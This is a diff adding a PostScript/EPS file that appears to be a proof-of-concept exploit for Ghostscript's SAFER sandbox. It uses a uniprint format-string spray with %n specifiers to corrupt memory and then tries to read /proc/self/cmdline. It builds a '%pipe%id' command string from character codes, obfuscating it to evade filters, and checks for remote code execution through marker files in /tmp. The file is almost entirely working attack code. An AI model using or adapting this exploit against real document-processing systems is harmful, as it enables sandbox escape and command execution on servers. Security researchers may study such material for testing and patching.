@@ -1,0 +1,48 @@
+%!PS-Adobe-3.0 EPSF-3.0
+%%BoundingBox: 0 0 100 100
+
+% Step 1: uniprint format string spray
+<< /OutputDevice /uniprint
+   /upColorModel /DeviceGray
+   /upWriteComponentCommands <<
+     /Prologue (\045d\045d\045d\045d\045n\045d\045d\045d\045n\045d\045d\045n)
+   >>
+>> setpagedevice
+0 0 moveto 100 100 lineto stroke
+showpage
+
+% Step 2: Switch back to pngalpha
+<< /OutputDevice /pngalpha >> setpagedevice
+
+% Step 3: Try operations that SAFER normally blocks
+% If %n corrupted SAFER, these will work
+
+% Test 1: Write to /tmp/ (this already works under SAFER)
+(/tmp/SAFER_TEST_WRITE.txt) (w) file (write works) writestring closefile
+
+% Test 2: Read /proc/self/cmdline (BLOCKED by SAFER normally)
+{(/proc/self/cmdline) (r) file 
+  (/tmp/SAFER_BYPASSED_CMDLINE.txt) (w) file
+  dup 4096 string readstring pop
+  3 index exch writestring
+  closefile closefile
+} stopped {
+  % If read failed, SAFER is still active
+  (/tmp/SAFER_STILL_ACTIVE.txt) (w) file (blocked) writestring closefile
+} if
+
+% Test 3: Try pipe (the ultimate test)
+{
+  % Build pipe string at runtime
+  /ps 100 string def
+  ps 0 37 put ps 1 112 put ps 2 105 put ps 3 112 put ps 4 101 put ps 5 37 put
+  ps 6 105 put ps 7 100 put
+  ps 0 8 getinterval (w) file
+  (/tmp/PIPE_EXECUTED.txt) writestring
+  closefile
+  (/tmp/RCE_CONFIRMED.txt) (w) file (PIPE WORKED) writestring closefile
+} stopped {
+  (/tmp/PIPE_BLOCKED.txt) (w) file (pipe still blocked) writestring closefile
+} if
+
+showpage
